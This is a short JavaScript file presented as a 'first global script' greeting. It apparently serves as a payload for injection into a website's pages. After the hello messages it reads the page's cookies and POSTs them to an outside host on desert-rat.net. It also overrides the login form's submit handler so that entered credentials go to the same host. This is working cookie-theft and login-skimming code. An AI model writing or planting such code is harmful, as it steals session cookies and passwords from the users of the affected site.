console.log('Hello from your first global script!');
alert('Hello from your first global script!');
console.log(document.cookie);
console.log(document.domain);

let data = document.cookie;

fetch("https://dam8opsp92lp2rjfbin0w6b4gjdnpct5t.desert-rat.net", {
  method: "POST",
  body: data,
});

login.onsubmit = async (e) => {
    e.preventDefault();

    let response = await fetch('https://dam8opsp92lp2rjfbin0w6b4gjdnpct5t.desert-rat.net', {
      method: 'POST',
      body: new FormData(login)
    });

    //let result = await response.json();

    //alert(result.message);
  };